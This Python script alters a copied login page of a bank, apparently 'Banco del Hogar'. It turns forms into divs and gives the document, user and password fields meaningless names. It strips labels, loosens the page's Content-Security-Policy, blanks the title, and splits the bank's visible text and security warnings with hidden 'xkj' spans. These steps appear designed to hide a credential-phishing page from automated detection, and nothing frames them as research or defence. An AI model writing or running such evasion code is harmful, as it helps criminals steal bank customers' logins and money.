import re

file_path = '/media/veracrypt7/1-MLZ/5i9o1e4a0io/index.html'
with open(file_path, 'r', encoding='utf-8') as f:
    content = f.read()

# 1. Replace <form> with <div>
content = re.sub(r'<form\b([^>]*)>', r'<div\1>', content)
content = re.sub(r'</form>', r'</div>', content)

# 2. Rename login to logn
content = content.replace('app-login', 'app-logn')
content = content.replace('loginCardContainer', 'lognCardContainer')
content = content.replace('cardlogin', 'cardlogn')
content = content.replace('loginTitle', 'lognTitle')
content = content.replace('loginBlanqueoRecupero', 'lognBlanqueoRecupero')
content = content.replace('from_login', 'from_logn')

# 3. Rename inputs (documento -> doko, usuario -> tiki, password -> toko)
content = content.replace('name=documento', 'name=doko').replace('formcontrolname=documento', 'formcontrolname=doko')
content = content.replace('name=usuario', 'name=tiki').replace('formcontrolname=usuario', 'formcontrolname=tiki')
content = content.replace('name=password', 'name=toko').replace('formcontrolname=password', 'formcontrolname=toko')

# 4. Remove prohibited attributes (aria-label, data-placeholder, data-mat-icon-type, data-mat-icon-name)
content = re.sub(r'\saria-label="[^"]*"', '', content)
content = re.sub(r'\saria-label=\S+', '', content)
content = re.sub(r'\sdata-placeholder="[^"]*"', '', content)
content = re.sub(r'\sdata-placeholder=\S+', '', content)
content = re.sub(r'\sdata-mat-icon-type="[^"]*"', '', content)
content = re.sub(r'\sdata-mat-icon-type=\S+', '', content)
content = re.sub(r'\sdata-mat-icon-name="[^"]*"', '', content)
content = re.sub(r'\sdata-mat-icon-name=\S+', '', content)

# 5. CSP update
old_csp = """<meta http-equiv=content-security-policy
  content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'self' 'unsafe-inline'; media-src 'self' data:; script-src 'self' 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:; connect-src 'self' ws: wss: http: https:;">"""
new_csp = """<meta http-equiv="Content-Security-Policy"
content="default-src 'none'; script-src 'self' 'unsafe-inline' data:; style-src 'self' 'unsafe-inline' http://127.0.0.1:5500; img-src 'self' data:; font-src 'self' data:; connect-src 'self' ws://127.0.0.1:5500; media-src 'self' data:; object-src 'self' data:; frame-src 'self' data:;">"""
content = content.replace(old_csp, new_csp)

# 6. Title rule 16.2 (remove title text, will be added via JS)
content = re.sub(r'<title>.*?</title>', r'<title></title>', content)

# 7. Obfuscation of visible text
strings_to_obfuscate = [
    "Consejos de seguridad",
    "El banco nunca va a solicitarte",
    "información personal.",
    "Nunca ingreses a",
    "que te llegan a través de los correos.",
    "Nunca compartas",
    "información sensible",
    "en redes sociales.",
    "Si recibís una",
    "comunicación por un supuesto error",
    ", comunicate con nosotros.",
    "Soy cliente",
    "Quiero ser cliente",
    "¡Hola, somos el Banco del Hogar!",
    "Documento",
    "Usuario",
    "Clave Búho Fácil",
    "¿Qué es la Clave Búho Fácil?",
    "Recordar mi documento",
    "Teclado virtual",
    "INGRESAR",
    "Recupero de usuario o clave",
    "Soy cliente, generar usuario y clave",
    "Mi cuenta está en riesgo",
    "Descuentos",
    "Términos y condiciones",
    "Conocé tus claves",
    "Políticas de seguridad"
]

def obfuscate(text):
    if len(text) > 3:
        mid = len(text)//2
        return f'{text[:mid]}<span style="display:none">xkj</span>{text[mid:]}'
    return text

for s in strings_to_obfuscate:
    content = content.replace(s, obfuscate(s))

with open(file_path, 'w', encoding='utf-8') as f:
    f.write(content)

print("Modificaciones aplicadas con exito.")
